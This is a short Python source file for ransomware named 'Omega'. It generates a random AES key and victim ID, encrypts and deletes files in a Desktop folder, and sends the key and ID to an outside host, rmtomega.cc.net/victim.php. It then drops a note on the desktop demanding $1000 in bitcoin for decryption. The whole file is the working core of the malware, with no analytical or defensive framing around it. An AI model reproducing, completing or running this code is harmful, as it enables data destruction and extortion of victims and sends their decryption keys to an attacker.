from aes_cipher import *
import uuid
import get_files
from web import *
if os.path.exists(os.path.expanduser('~') + '\\desktop\\note.txt'):
    sys.exit()
key = str(uuid.uuid4().get_hex().upper()[0:16])
uid = str(uuid.uuid4().get_hex().upper()[0:10])
username = os.getenv('username')
path2enc = os.path.expanduser('~') + '\\desktop\\test\\'
url = "http://rmtomega.cc.net/victim.php"
note =  '''
Omega!
---------------
Your files have been encrypted. You have to pay  a ransom, 1000$ in BTC currency to xxxxxxxxxxxxxxxxx,
after completing the payment plz E-mail me at xxxxx@gmail.com
and I will send you the decryption key. Your unique ID  is: '{}''''.format(uid)
files = get_files.find_files(path2enc)
for _file in files:
    encrypt_file(key,_file)
    os.remove(_file)

sendcred(url,key,uid)


notefile = open(os.path.expanduser('~') + '\\desktop\\note.txt','w')
notefile.write(note)
notefile.close()
